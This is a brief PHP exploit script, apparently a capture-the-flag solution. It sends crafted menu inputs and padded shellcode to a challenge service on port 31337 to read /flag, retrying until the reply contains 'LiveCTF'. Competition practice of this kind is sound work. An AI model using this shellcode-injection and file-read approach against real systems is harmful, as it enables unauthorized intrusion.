<?php
$env = getenv("HOST");
define("HOST", $env ? $env : "localhost");
define("PORT", 31337);

$shellcode = file_get_contents("shellcode");
$payload   = "";

// wtf?
$payload  .= "1\n";
$payload  .= "/dev/null\n";
$payload  .= "1\n";
$payload  .= "/dev/null\n";

$payload  .= "1\n";
$payload  .= "/flag\n";

$payload  .= "1\n";
$payload  .= "/dev/stdin\n";
$payload  .= str_pad($shellcode, 0x100);

$payload  .= "2\n";
$payload  .= "3\n";

do {
	$fp = fsockopen(HOST, PORT);
	fwrite($fp, $payload);

	$buffer = "";
	while($d = fread($fp, 4096))
		$buffer .= $d;

} while(false === strpos($buffer, "LiveCTF"));
echo $buffer;
